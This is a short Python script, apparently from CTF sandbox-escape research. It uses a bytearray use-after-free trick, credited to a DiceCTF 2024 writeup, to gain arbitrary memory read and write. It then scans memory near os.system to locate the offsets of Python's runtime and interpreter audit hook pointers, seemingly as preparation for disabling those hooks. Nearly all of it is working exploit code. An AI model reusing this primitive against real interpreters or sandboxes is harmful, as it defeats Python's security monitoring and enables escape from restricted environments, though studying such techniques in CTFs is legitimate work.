#!audit_hook_head_finder
from audit_hook_head_finder import get_runtime_audit_hook_ptr_addr, get_interp_audit_hook_ptr_addr

import os

DEPTH = 50

getptr = lambda func: int(str(func).split("0x")[-1].split(">")[0], 16)
# following arbitery reading/writing exploit code from https://maplebacon.org/2024/02/dicectf2024-irs/
# improved by Maple Bacon
class UAF:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 1

uaf = bytearray(56)
uaf[23] = UAF()
# end of arbitery writing exploit code

ptr = getptr(os.system.__init__)

# to use brute-force, you should run this script multiple times
# to find the const offset
print("searching for possible offsets to audit hook")
p = []
for i in range(DEPTH):
    if len(hex(int.from_bytes(memory[ptr + i:ptr + i + 8], 'little'))) == len(hex(get_runtime_audit_hook_ptr_addr())):
        p.append(i)
for j in p:
    ptr2 = ptr + j
    ptr2 = int.from_bytes(memory[ptr2:ptr2 + 8], 'little')
    print("searching", j)
    for i in range(DEPTH):
        nptr = int.from_bytes(memory[ptr2 + i:ptr2 + i + 8], 'little')
        if hex(nptr)[:6] == hex(get_runtime_audit_hook_ptr_addr())[:6] and len(hex(nptr)) == len(hex(get_runtime_audit_hook_ptr_addr())):
            print("C ",f"index=({j}, {i})", f"offset={hex(get_runtime_audit_hook_ptr_addr() - nptr)}", hex(nptr))
        if hex(nptr)[:6] == hex(get_interp_audit_hook_ptr_addr())[:6] and len(hex(nptr)) == len(hex(get_interp_audit_hook_ptr_addr())):
            print("PY",f"index=({j}, {i})", f"offset={hex(get_interp_audit_hook_ptr_addr() - nptr)}", hex(nptr))